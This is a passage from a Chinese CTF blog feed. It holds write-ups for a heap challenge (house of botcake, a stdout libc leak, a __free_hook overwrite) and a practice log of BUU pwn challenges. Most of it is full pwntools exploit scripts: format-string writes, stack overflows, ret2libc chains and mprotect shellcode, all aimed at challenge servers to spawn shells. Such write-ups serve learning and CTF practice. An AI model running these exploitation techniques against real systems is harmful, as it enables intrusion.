class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;have try:&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br>        i+=<span class="hljs-number">1</span><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>最后要改read_got为syscall+0x1b 我本地有三个位要爆破，1/4096成功，</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/baopo.png" alt="baopo"></p><p>不过这题远端只要爆破一位1/16，我真的是吃饱了撑的</p><h2 id="magic-book">magic_book</h2><h3 id="0x01程序分析">0x01程序分析</h3><p>保护全开</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%983%E4%BF%9D%E6%8A%A4.png" alt="题3保护"></p><p>有add和delete功能</p><p>选择9的话还有只能使用1次的uaf</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/uaf.png" alt="uaf"></p><p>没有show功能，要泄露libc就要打IO_stdout</p><p>用的libc是2.31的，还能用hook</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/libc2.31%E9%A2%983.png" alt="libc2.31题3"></p><h3 id="0x02利用思路">0x02利用思路</h3><p>1.使用house of botcake 的手法，在仅使用一次uaf的情况下，避免了tcache的key值检测，造成tcache poioning的效果</p><p>（victim堆在同一个地址，一个在tcachebin，一个在unsortbin）</p><p>2.切割unsortbin，修改unsortbin中存的main_arena+96地址为stdout（最后12位偏移不变，第12~16位要爆破4位，半个字节1/16）</p><p>改unsorbin中victim的fd指向存有stdout的堆的地址（堆地址也是一样，第四位要爆破1/16），造成tcache poioning指向stdout</p><p>3.分配堆到stdout，然后这么填<code>flat(0xfbad1800,0,0,0,b'\x00')</code>就能靠puts泄露出libc了</p><p>4.复用house of botcake ，往free_hook里写system,释放带有/bin/sh的chunk</p><p>所以成功率1/256</p><p><strong>exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/pwn/libc&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/pwn/ld&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uaf</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------house_of_botcake--------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#0~6</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#7</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#8</span><br>    add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#9</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(i)<br>    uaf(<span class="hljs-number">8</span>)<br>    delete(<span class="hljs-number">7</span>)<br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#10</span><br>    delete(<span class="hljs-number">8</span>)<br>    <span class="hljs-comment">#------_IO_stdout leak------------------</span><br>    add(<span class="hljs-number">0x50</span>,p16(<span class="hljs-number">0x26a0</span>))<span class="hljs-comment">#11</span><br>    add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p16(<span class="hljs-number">0xb690</span>))<span class="hljs-comment">#12</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<span class="hljs-comment">#13</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<span class="hljs-comment">#14</span><br>    add(<span class="hljs-number">0x80</span>,flat(<span class="hljs-number">0xfbad1800</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<span class="hljs-comment">#15</span><br>    stdin=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>    libc_base=uu64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>,timeout=<span class="hljs-number">0.1</span>)[-<span class="hljs-number">6</span>:])-stdin<br><br>    <span class="hljs-keyword">if</span> libc_base == -stdin:<br>        exit(-<span class="hljs-number">1</span>)<br><br>    info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>    system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    <span class="hljs-comment">#-------re botcake------------------------------</span><br>    delete(<span class="hljs-number">13</span>)<br>    delete(<span class="hljs-number">12</span>)<br>    add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(free_hook))<span class="hljs-comment">#16</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<span class="hljs-comment">#17</span><br>    add(<span class="hljs-number">0x80</span>,p64(system))<span class="hljs-comment">#18</span><br>    delete(<span class="hljs-number">17</span>)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#r=process(&#x27;./pwn&#x27;)</span><br>        r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29922</span>)<br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>            r.interactive()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br><br></code></pre></td></tr></table></figure><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%983shell.png" alt="题3shell"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IO_leak</tag>
      
      <tag>rop</tag>
      
      <tag>shellocde</tag>
      
      <tag>house of botcake</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南大PA记录</title>
    <link href="/2022/03/01/%E5%8D%97%E5%A4%A7PA%E8%AF%BE%E7%A8%8B/"/>
    <url>/2022/03/01/%E5%8D%97%E5%A4%A7PA%E8%AF%BE%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2c614681beb24a571b1daa511af71762fd98fe9d6398da1afefd6b8e6b8cc314"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">还没完成</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU刷题</title>
    <link href="/2020/11/24/buu%E5%88%B7%E9%A2%98/"/>
    <url>/2020/11/24/buu%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>因为真的花了大把时间去刷题，感谢carol师傅的贴心指导，好在过去记录了,一些话都是以前写的，放进来，未来不会再刷了，因为题目过时了，还有卷glibc也没什么用，早知道这点该多好(悲</p><p>还有一些不全的就不放了，也可能有重复，不过真的有人会看吗🤤</p><p>要找题目建议，浏览器CTRL+F，搜索题目</p><h2 id="大一上">大一上</h2><h3 id="第五空间2019-决赛-PWN5">[第五空间2019 决赛]PWN5</h3><p>利用格式化字符串漏洞和%n能改某地址改写数据</p><p>本题要改写的地址上的数据在.bss段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25657</span>)<br><br><span class="hljs-comment">#先跑遍程序找下偏移，例如送：aaaa,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</span><br><span class="hljs-comment">#找出formats在栈中的偏移</span><br>offest=<span class="hljs-number">10</span><br>dizhi=<span class="hljs-number">0x0804C044</span><br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,p32(dizhi)+<span class="hljs-string">&#x27;%10$n&#x27;</span>)<br><span class="hljs-comment">#地址在前，偏移指定位数，填a什么的改你要的值（好像只能大于等于4）</span><br>r.sendlineafter(<span class="hljs-string">&#x27;passwd&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-r2t3">[BJDCTF 2nd]r2t3</h3><p>#本题strlen,strcpy都用\x00检测末尾，不能用\x00绕过</p><p>#32位程序考虑整数溢出绕过，而且题目给了那么多空间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29897</span>)<br>shell=<span class="hljs-number">0x0804858b</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x11</span>)+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(shell)+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">260</span>-<span class="hljs-number">0x11</span>-<span class="hljs-number">8</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-en-2">ciscn_2019_en_2</h3><p>题目跟ciscn_2019_c_1重复了23333</p><h3 id="get-started-3dsctf-2016">get_started_3dsctf_2016</h3><p>这道题是栈溢出到指定函数。但要注意程序中有的是类似cat flag，不是开shell，直接溢出绕过if条件的话，程序错误退出flag不会显示</p><p>根据if条件，摆对两个参数，函数返回值跳到exit正常退出即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27426</span>)<br>catflag=<span class="hljs-number">0x080489a0</span><br>elf=ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>main=<span class="hljs-number">0x08048A20</span><br>exit=<span class="hljs-number">0x804e6a0</span><br>ret=<span class="hljs-number">0x08048196</span> <br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p32(ret)+p32(catflag)+p32(exit)+p32(<span class="hljs-number">0x308CD64F</span>)+p32(<span class="hljs-number">0x195719D1</span>)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>这程序静态链接，另一种解法是利用mprotect函数，通过给bss段赋可执行权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29970</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>mprotect = <span class="hljs-number">0x0806EC80</span><br>bss=<span class="hljs-number">0x080eb000</span><br>pop_ebx_esi_edi_ret=<span class="hljs-number">0x080509a5</span> <span class="hljs-comment"># pop ebx ; pop esi ; pop edi ; ret</span><br><br><span class="hljs-comment">#这里ebx==rdx好像</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p32(elf.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>])+p32(pop_ebx_esi_edi_ret)+p32(bss)+p32(<span class="hljs-number">0x2d</span>)+p32(<span class="hljs-number">7</span>)<br>payload+=p32(elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>])+p32(bss)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x2c</span>)<br><span class="hljs-comment">#这里是先给bss段开可读可写可执行，然后调用个输入函数，再送个shellcraft进去</span><br>r.sendline(payload)<br>pd=asm(shellcraft.sh())<br>r.sendline(pd)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-8">ciscn_2019_n_8</h3><p>这题输入值把var[13]变成17</p><p>搞不清楚什么时候用p32打包数字，什么时候直接str(数字)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29729</span>)<br>r.sendline(<span class="hljs-string">&#x27;aaaa&#x27;</span>*<span class="hljs-number">13</span>+p32(<span class="hljs-number">17</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="jarvisoj-level2：">jarvisoj_level2：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26947</span>)<br>system=<span class="hljs-number">0x8048320</span><br>binsh=<span class="hljs-number">0x804a024</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="not-the-same-3dsctf-2016">not_the_same_3dsctf_2016</h3><p>程序有cat flag的值到.bss段，跳至指定函数，返回时用输出函数打印flag，反回地址填exit函数，正常退出便会显示flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28327</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)<br>flag=<span class="hljs-number">0x080ECA2D</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2d</span>+p32(elf.sym[<span class="hljs-string">&#x27;get_secret&#x27;</span>])<br><br>payload+=p32(elf.sym[<span class="hljs-string">&#x27;printf&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;exit&#x27;</span>])+p32(flag)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>另一种解法就是用mprotect提权，写shellcode到.bss段，没试过</p><h3 id="bjdctf-2020-babystack">bjdctf_2020_babystack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28514</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>,<span class="hljs-string">&#x27;30&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x4006E6</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop">[HarekazeCTF2019]baby_rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28521</span>)<br>binsh=<span class="hljs-number">0x601048</span><br>pop_rdi=<span class="hljs-number">0x0400683</span><br>sys=<span class="hljs-number">0x400490</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_rdi)+p64(binsh)+p64(sys))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="jarvisoj-level2-x64">jarvisoj_level2_x64</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26124</span>)<br>binsh=<span class="hljs-number">0x600A90</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>sys=<span class="hljs-number">0x4004C0</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi)+p64(binsh)+p64(sys))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-5">ciscn_2019_n_5</h3><p>#ida看gets是两个参数，但实际写入貌似是第一个参数</p><p>#没开nx，canary第一次写sh到bss，第二次栈溢出跳bss段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27640</span>)<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>sh=asm(shellcraft.sh())<br>r.sendline(sh)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x601080</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="铁人三项-第五赛区-2018-rop">铁人三项(第五赛区)_2018_rop</h3><p>#标准的ret2libc</p><p>#网上有用write写到bss，相对麻烦了点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27790</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./2018_rop&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>payload+=p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">4</span>)<br>r.sendline(payload)<br>true=u32(r.recv(<span class="hljs-number">4</span>))<br>base=true-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x17b8cf</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(<span class="hljs-number">0x08048323</span>)+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="bjdctf-2020-babyrop">bjdctf_2020_babyrop</h3><p>也是ret2libc</p><p>特别注意接受打印出来的真实地址时格式应该怎么接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29945</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x0000000000400733</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">&#x27;story!\n&#x27;</span>)<br>true=u64(r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>base=true-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x18cd57</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span 